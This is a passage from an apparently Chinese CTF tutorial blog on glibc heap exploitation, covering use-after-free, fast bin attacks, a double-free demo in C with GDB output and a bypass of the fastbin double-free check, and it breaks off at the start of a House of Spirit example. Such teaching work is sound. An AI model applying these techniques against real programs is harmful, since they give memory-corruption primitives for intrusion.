data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A830.png" alt="CTF - PWN_堆相关的漏洞与利用30.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A831.png" alt="CTF - PWN_堆相关的漏洞与利用31.png"></p><p>执行 <code>free(a)</code> 后，<code>chunk a</code> 被置于 <code>fast bin</code> 中</p><p><strong><code>myname</code> 指针被置为 NULL，但 <code>func</code> 指针未发生变化</strong>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A832.png" alt="CTF - PWN_堆相关的漏洞与利用32.png"></p><p>此时通过 <code>a -&gt; func("I can also use it")</code> 依然可以调用 <code>myprint()</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A833.png" alt="CTF - PWN_堆相关的漏洞与利用33.png"></p><p>当我们将 <code>func</code> 指针修改为 <code>printmyname()</code> 后，通过 <code>a -&gt; func("this is my function")</code> 也可以调用 <code>printmyname()</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A834.png" alt="CTF - PWN_堆相关的漏洞与利用34.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A835.png" alt="CTF - PWN_堆相关的漏洞与利用35.png"></p><p>当我们通过 <code>a = NULL</code> 将其置为 NULL 后，<strong>堆的布局并未发生变化</strong>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A836.png" alt="CTF - PWN_堆相关的漏洞与利用36.png"></p><p>但当我们再次使用 <code>a -&gt; func("can not be printed...")</code> 的时候</p><p>**程序会直接报出段错误，而不是继续调用 <code>0x4005d1</code> 地址处的 <code>printmyname()</code>**：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A837.png" alt="CTF - PWN_堆相关的漏洞与利用37.png"></p><blockquote><p>发生段错误的关键在于：</p><p>我们前面执行 <code>a = NULL</code> 的时候将 RBP - 8 地址处置为了 0，因此执行 <code>mov rax, qword ptr [rbp - 8]</code> 时 RAX = 0，此时执行 <code>mov rax, qword ptr [rax + 8]</code> 要求从内存地址为 8 的地方取值赋给 RAX，显然这个内存地址是错误的</p></blockquote><hr><h1 id="Fast-bin-Attack"><a href="#Fast-bin-Attack" class="headerlink" title="Fast bin Attack"></a>Fast bin Attack</h1><blockquote><p>Fast bin Attack 是一类漏洞的利用方法，是指所有基于 <code>fast bin</code> 机制的漏洞利用方法</p><p>参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9mYXN0YmluLWF0dGFjay8=">Fastbin Attack - CTF Wiki</a></p></blockquote><p>Fast bin Attack 利用的前提：</p><ul><li>存在堆溢出、UAF 等能控制 <code>chunk</code> 内容的漏洞</li><li>漏洞发生于 <code>fast bin</code> 类型的 <code>chunk</code> 中</li></ul><p>由于 <code>fast bin</code> 使用单链表来维护释放的堆块，并且<strong>由 <code>fast bin</code> 管理的 <code>chunk</code> 即使被释放，其 <code>next_chunk</code> 的 <code>prev_inuse</code> 位也不会被清空</strong></p><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">,</span> <span class="token operator">*</span>chunk3<span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 进行释放</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行三次 <code>free</code> 进行释放后</p><p>此时位于 <code>main_arena</code> 中的 <code>fastbin</code> 链表中已经储存了指向 <code>chunk3</code> 的指针（最近释放），并且 <code>chunk3</code>、<code>chunk2</code>、<code>chunk1</code> 构成了一个单链表：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A851.png" alt="CTF - PWN_堆相关的漏洞与利用51.png"></p><hr><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><blockquote><p>Double free 指同一个指针指向的内存被 <code>free</code> 两次</p><p>堆上的某块内存被释放后，如果没有将指向该堆块的指针清零，就可以利用程序的其他部分对该内存进行再次的 <code>free</code>，<strong>最终得到一个可用的空闲块指针，并且能够修改已经被释放的空闲块中的内容</strong>，从而利用这个漏洞实现<strong>任意地址写</strong></p><p>参考文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241598">堆利用系列之堆漏洞-安全客 - 安全资讯平台</a></p></blockquote><p>总的来说，double free 就是通过 2 次 <code>free</code>，2 次 <code>malloc</code>，再 1 次 <code>free</code>，最终得到可用的空闲块指针，并且可以修改空闲块中的内容</p><p>详细来说就是：</p><ol><li>首先两次 <code>free</code> 同一块地址（两次 <code>free</code> 之间需要先 <code>free</code> 一次其他的 <code>chunk</code> 来绕过检测）</li><li>然后再连续两次 <code>malloc</code> 相同大小</li><li>然后再 <code>free</code> 掉其中一个</li><li>那么剩下那个指针指向的就是空闲块的 <code>chunk</code>，而且还是可以被修改的</li></ol><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>ptr0<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">;</span>

    ptr0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk1</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk2</span>
    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk3</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>data0 <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data1 <span class="token operator">=</span> <span class="token string">"11111111"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data2 <span class="token operator">=</span> <span class="token string">"22222222"</span><span class="token punctuation">;</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr2<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk1: ptr0 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr0<span class="token punctuation">,</span> ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk2: ptr1 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr1<span class="token punctuation">,</span> ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk3: ptr2 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr2<span class="token punctuation">,</span> ptr2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// double free</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">,</span> <span class="token operator">*</span>ptr5<span class="token punctuation">;</span>

    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk4</span>
    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk5</span>
    ptr5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk6</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: ptr4 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr4<span class="token punctuation">,</span> ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr3 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>data3 <span class="token operator">=</span> <span class="token string">"15935728"</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data3<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过 GDB 调试观察一下整个执行流程</p><p>刚开始创建三个堆块 <code>ptr0</code>、<code>ptr1</code> 和 <code>ptr2</code>，并通过 <code>data0</code>、<code>data1</code>、<code>data2</code> 进行赋值：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A838.png" alt="CTF - PWN_堆相关的漏洞与利用38.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk1<span class="token operator">:</span> ptr0 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">00000000</span>
Chunk2<span class="token operator">:</span> ptr1 @ <span class="token number">0x602050</span>	 contains<span class="token operator">:</span> <span class="token number">11111111</span>
Chunk3<span class="token operator">:</span> ptr2 @ <span class="token number">0x602090</span>	 contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先 <code>free</code> 掉 <code>ptr0</code> 和 <code>ptr1</code>，它们都被置于 <code>fast bin</code> 中：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A839.png" alt="CTF - PWN_堆相关的漏洞与利用39.png"></p><p><code>ptr1</code> 的 <code>fd</code> 指针指向下一个空闲的 <code>chunk</code>，即：<code>ptr0</code> 的地址</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A842.png" alt="CTF - PWN_堆相关的漏洞与利用42.png"></p><blockquote><p>注意：</p><p>在对 <code>ptr0</code> 的 double free 之间，我们穿插了一个 <code>free(ptr1)</code> 的操作，这么做不是毫无根据的，而是为了绕过检测</p><p>因为在不同版本的 <code>malloc</code> 中，可能存在对 double free 的检测：<strong>如果当前被释放的指针与最后一个释放的内存块相同，程序将停止执行</strong></p><p>而 <code>fast bin</code> 在执行 <code>free</code> 的时候仅验证了 <code>main_arena</code> 直接指向的块，即链表指针头部的块，对于链表后面的块，并没有进行验证</p><p>因此，绕过这个检测的方法就是：<strong>在两次释放同一个指针之间释放另一个指针</strong>（但是在 Glibc 2.27 中，它将命中 <code>tcache</code>，就不存在这个问题）</p></blockquote><p>为了实现 double free，我们再次 <code>free</code> 掉 <code>ptr0</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A840.png" alt="CTF - PWN_堆相关的漏洞与利用40.png"></p><p>此时 <code>ptr1</code> 的 <code>fd</code> 指针指向 <code>ptr0</code> 的地址，同时 <code>ptr0</code> 的 <code>fd</code> 指针也指向 <code>ptr1</code> 的地址</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A841.png" alt="CTF - PWN_堆相关的漏洞与利用41.png"></p><p>接下来，我们将分配三个新内存块，大小与我们释放的内存块相同</p><p>执行完 <code>ptr3 = malloc(0x30)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A843.png" alt="CTF - PWN_堆相关的漏洞与利用43.png"></p><p>执行完 <code>ptr4 = malloc(0x30)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A844.png" alt="CTF - PWN_堆相关的漏洞与利用44.png"></p><p>执行完 <code>ptr5 = malloc(0x30)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A845.png" alt="CTF - PWN_堆相关的漏洞与利用45.png"></p><p>向它们写入 <code>data0</code>、<code>data1</code>、<code>data2</code> 的数据，这将使我们得到之前释放的三个内存块</p><p>执行完 <code>memcpy(ptr3, data0, 0x8)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A846.png" alt="CTF - PWN_堆相关的漏洞与利用46.png"></p><p>执行完 <code>memcpy(ptr4, data1, 0x8)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A847.png" alt="CTF - PWN_堆相关的漏洞与利用47.png"></p><p>执行完 <code>memcpy(ptr5, data2, 0x8)</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A848.png" alt="CTF - PWN_堆相关的漏洞与利用48.png"></p><p>可以看到，向 <code>ptr5</code> 中写入的数据实际写入到了 <code>chunk4</code> 中</p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">22222222</span>
Chunk5<span class="token operator">:</span> ptr4 @ <span class="token number">0x602050</span>	 contains<span class="token operator">:</span> <span class="token number">11111111</span>
Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>到这里可以发现，<strong>由于前面两次释放了同一个指针，现在我们分配到了相同的指针</strong>（因为 <code>malloc</code> 会出于性能提升的原因重用相似大小的已释放内存块）</p></blockquote><p><em>现在我们可以释放指向 <code>chunk4</code> 或 <code>chunk6</code> 的其中一个指针（即：<code>ptr3</code> 或 <code>ptr5</code>），并清除该指针（防止使用释放后的指针），而我们仍然会有一个指针指向同一个内存块，而该内存块现在已被释放</em></p><p><mark>也就是说，我们可以利用 double free 来编辑已释放的内存块</mark></p><p>执行 <code>free(ptr3)</code> 并将 <code>ptr3</code> 置为 NULL 后：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A849.png" alt="CTF - PWN_堆相关的漏洞与利用49.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过 <code>memcpy(ptr5, data3, 0x8)</code> 向 <code>ptr5</code> 写入数据时，<strong>会将数据写入到已经被释放的 <code>chunk4</code> 中</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A850.png" alt="CTF - PWN_堆相关的漏洞与利用50.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">15935728</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><blockquote><p>House of Spirit 是&nbsp;the Malloc Maleficarum&nbsp;中的一种技术，其核心在于：<strong>在目标位置处伪造 <code>fast bin chunk</code>，并将其释放，从而实现分配指定地址的 <code>chunk</code></strong></p></blockquote><p>要想构造 <code>fast bin fake chunk</code> 并且将其释放时，可以将其放入到对应的 <code>fast bin</code> 链表中，但需要绕过一些必要的检测：</p><ul><li><code>fake chunk</code> 的 <code>ISMMAP</code> 位不能为 1，因为 <code>free</code> 时，如果是 <code>mmap</code> 的 <code>chunk</code>，会单独处理</li><li><code>fake chunk</code> 地址需要对齐，<code>MALLOC_ALIGN_MASK</code></li><li><code>fake chunk</code> 的 <code>size</code> 大小需要满足对应的 <code>fast bin</code> 的需求，同时也得对齐</li><li><code>fake chunk</code> 的 <code>next chunk</code> 的大小不能小于&nbsp;<code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li><li><code>fake chunk</code> 对应的 <code>fast bin</code> 链表头部不能是该 <code>fake chunk</code>，即不能构成 <code>double free</code> 的情况</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
